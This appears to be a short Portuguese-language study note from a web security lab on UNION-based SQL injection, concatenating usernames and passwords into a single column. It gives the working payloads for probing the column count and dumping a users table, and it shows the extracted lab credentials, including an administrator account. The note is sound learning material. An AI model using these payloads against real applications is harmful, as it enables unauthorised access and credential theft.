# SQL Injection - Retrieving Multiple Values in a Single Column

## Objetivo

Extrair múltiplos valores utilizando apenas uma coluna disponível na aplicação.

---

## Descobrir quantidade de colunas

```sql
' UNION SELECT NULL,'abc'--
```

Resultado:

- Existem 2 colunas
- Apenas a segunda aceitava texto

---

## Extração de dados

```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

## Como funciona

```sql
username||'~'||password
```

`||` concatena valores em uma única saída.

Exemplo:

```txt
wiener~ilt051kes1ihhq8bxutp
carlos~63nil3bgaho8flywa6i1
administrator~gz2tgpqcymq0hk644rry
```

Isso permite visualizar múltiplos dados mesmo quando apenas uma coluna pode exibir texto.

---

## Resultado

Foi possível visualizar usuários e senhas armazenados no banco, incluindo a conta `administrator`.

---

## Aprendizado

Nem sempre é possível exibir dados em várias colunas. Em alguns casos é necessário combinar informações em uma única saída usando concatenação.
